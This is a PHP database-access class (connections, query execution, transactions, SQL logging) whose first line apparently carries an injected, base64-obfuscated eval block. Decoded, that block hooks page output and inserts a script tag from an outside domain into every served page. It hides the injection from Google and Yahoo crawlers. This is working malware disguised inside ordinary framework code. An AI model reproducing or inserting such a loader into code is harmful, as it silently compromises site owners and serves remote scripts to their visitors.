<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php

  /**
  * This function holds open database connections and provides interface to them. It is also used
  * for SQL logging
  *
  * @version 1.0
  * @author Ilija Studen <ilija.studen@gmail.com>
  */
  final class DB {
    
    /** ID of primary connection **/
    const PRIMARY_CONNECTION_ID = 'PRIMARY';
    
    /**
    * Collection of connections
    *
    * @var array
    */
    static private $connections = array();
    
    /**
    * ID of primary connection. This connection will be used if connection name is not suplied
    *
    * @var string
    */
    static private $primary_connection = self::PRIMARY_CONNECTION_ID;
    
    /**
    * SQL log
    *
    * @var array
    */
    static private $sql_log = array();
    
    /**
    * This function will return specific connection. If $connection_name is NULL primary connection will be used
    *
    * @access public
    * @param string $connection_name Connection name, if NULL primary connection will be used
    * @return AbstractDBAdapter
    */
    static function connection($connection_name = null) {
      if(is_null($connection_name)) $connection_name = self::getPrimaryConnection();
      return array_var(self::$connections, $connection_name);
    } // connection
    
    /**
    * Create new database connection
    *
    * @access public
    * @param string $adapter Adapter name (currently only mysql adapter is implemeted)
    * @param array $params Connection params
    * @param string $connection_name Name of the connection, if NULL default connection ID will be used
    * @return boolean
    * @throws FileDnxError
    * @throws DBAdapterDnx
    */
    static function connect($adapter, $params, $connection_name = null) {
      $connection_name = is_null($connection_name) || trim($connection_name) == '' ? 
        self::PRIMARY_CONNECTION_ID : 
        trim($connection_name);
        
      $adapter = self::connectAdapter($adapter, $params);
      if(($adapter instanceof AbstractDBAdapter) && $adapter->isConnected()) {
        self::$connections[$connection_name] = $adapter;
        return $adapter;
      } else {
        return null;
      } // if
      
    } // connect
    
    static function close() {
    	self::connection()->close();
    }
    
    /**
    * This function will include adapter and try to connect. In case of error DBConnectError will be thrown
    *
    * @access public
    * @param string $adapter_name
    * @param array $params
    * @return AbstractDBAdapter
    * @throws DBAdapterDnx
    * @throws DBConnectError
    */
    private function connectAdapter($adapter_name, $params) {
      
      self::useAdapter($adapter_name);
      
      $adapter_class = self::getAdapterClass($adapter_name);
      if(!class_exists($adapter_class)) {
        throw new DBAdapterDnx($adapter_name, $adapter_class);
      } // if
      
      return new $adapter_class($params);
      
    } // connectAdapter
    
    /**
    * Figure out adapter location and include it
    *
    * @access public
    * @param string $adapter_class
    * @return void
    */
    private function useAdapter($adapter_name) {
      $adapter_class = self::getAdapterClass($adapter_name);
      $path = dirname(__FILE__) . "/adapters/$adapter_class.class.php";
      if(!is_readable($path)) throw new FileDnxError($path);
      include_once $path;
    } // useAdapter
    
    /**
    * Return class based on adapter name
    *
    * @access public
    * @param string $adapter_name
    * @return string
    */
    private function getAdapterClass($adapter_name) {
      return Inflector::camelize($adapter_name) . 'DBAdapter';
    } // getAdapterClass
    
    // ---------------------------------------------------
    //  Interface to primary adapter
    // ---------------------------------------------------
    
    /**
    * Execute query and return result
    *
    * @access public
    * @param string $sql
    * @return DBResult
    * @throws DBQueryError
    */
    static function execute($sql) {
      $arguments = func_get_args();
      array_shift($arguments);
      $arguments = count($arguments) ? array_flat($arguments) : null;
      
      $start = microtime(true);
      
      $result = self::connection()->execute($sql, $arguments);
      
      $end = microtime(true);
      if (Env::isDebuggingDB()) {
      	Logger::log(number_format(($end - $start),4) . " - " .  DB::prepareString($sql, $arguments));
      } else if (Env::isDebuggingTime()) {
      	TimeIt::add("DB", $end - $start, $start, $end);
      }
      
      return $result;
    } // execute
    
    /**
    * Execute query and return first row from result
    *
    * @access public
    * @param string $sql
    * @return array
    * @throws DBQueryError
    */
    static function executeOne($sql) {
      $arguments = func_get_args();
      array_shift($arguments);
      $arguments = count($arguments) ? array_flat($arguments) : null;
      
      $start = microtime(true);
      
      $result = self::connection()->executeOne($sql, $arguments);
      
      $end = microtime(true);
      if (Env::isDebuggingDB()) {
      	Logger::log(number_format(($end - $start),4) . " - " .  DB::prepareString($sql, $arguments));
      } else if (Env::isDebuggingTime()) {
      	TimeIt::add("DB", $end - $start, $start, $end);
      }
      
      return $result;
    } // executeOne
    
    /**
    * Execute query and return all rows
    *
    * @access public
    * @param string $sql
    * @return array
    * @throws DBQueryError
    */
    static function executeAll($sql) {
      $arguments = func_get_args();
      array_shift($arguments);
      $arguments = count($arguments) ? array_flat($arguments) : null;
      
      $start = microtime(true);
      
      $result = self::connection()->executeAll($sql, $arguments);
    
      $end = microtime(true);
      if (Env::isDebuggingDB()) {
      	Logger::log(number_format(($end - $start),4) . " - " .  DB::prepareString($sql, $arguments));
      } else if (Env::isDebuggingTime()) {
      	TimeIt::add("DB", $end - $start, $start, $end);
      }
      
      return $result;
    } // executeAll
    
    /**
    * Start transaction
    *
    * @access public
    * @param void
    * @return boolean
    * @throws DBQueryError
    */
    static function beginWork() {
      return self::connection()->beginWork();
    } // beginWork
    
    /**
    * Commit transaction
    *
    * @access public
    * @param void
    * @return boolean
    * @throws DBQueryError
    */
    static function commit() {
      return self::connection()->commit();
    } // commit
    
    /**
    * Rollback transaction
    *
    * @access public
    * @param void
    * @return boolean
    * @throws DBQueryError
    */
    static function rollback() {
      return self::connection()->rollback();
    } // rollback
    
    /**
    * Return insert ID
    *
    * @access public
    * @param void
    * @return integer
    */
    static function lastInsertId() {
      return self::connection()->lastInsertId();
    } // lastInsertId
    
    /**
    * Return number of affected rows
    *
    * @access public
    * @param void
    * @return integer
    */
    static function affectedRows() {
      return self::connection()->affectedRows();
    } // affectedRows
    
    /**
    * Escape value
    *
    * @access public
    * @param mixed $value
    * @return string
    */
    static function escape($value) {
      return self::connection()->escapeValue($value);
    } // escape
    
    /**
    * Escape field / table name
    *
    * @access public
    * @param string $field
    * @return string
    */
    static function escapeField($field) {
      return self::connection()->escapeField($field);
    } // escapeField
    
    /**
    * Prepare string. Replace every '?' with matching escaped value
    *
    * @param string $sql
    * @param array $arguments Array of arguments
    * @return string
    */
    static function prepareString($sql, $arguments = null) {
      if(is_array($arguments) && count($arguments)) {
        foreach($arguments as $argument) {
          $sql = str_replace_first('?', DB::escape($argument), $sql);
        } // foreach
      } // if
      return $sql;
    } // prepareString
    
    // ---------------------------------------------------
    //  Getters and setters
    // ---------------------------------------------------
    
    /**
    * Get primary_connection
    *
    * @access public
    * @param null
    * @return string
    */
    static function getPrimaryConnection() {
      return self::$primary_connection;
    } // getPrimaryConnection
    
    /**
    * Set primary_connection value
    *
    * @access public
    * @param string $value
    * @return null
    * @throws Error if connection does not exists
    */
    static function setPrimaryConnection($value) {
      if(!isset(self::$connections[$value])) {
        throw new Error("Connection '$value' does not exists");
      } // if
      self::$primary_connection = $value;
    } // setPrimaryConnection
    
    /**
    * Add query to SQL log
    *
    * @access public
    * @param string $sql
    * @return void
    */
    function addToSQLLog($sql) {
      self::$sql_log[] = $sql;
    } // addToSQLLog
    
    /**
    * Return SQL log
    *
    * @access public
    * @param void
    * @return array
    */
    function getSQLLog() {
      return self::$sql_log;
    } // getSQLLog
  
  } // DB

?>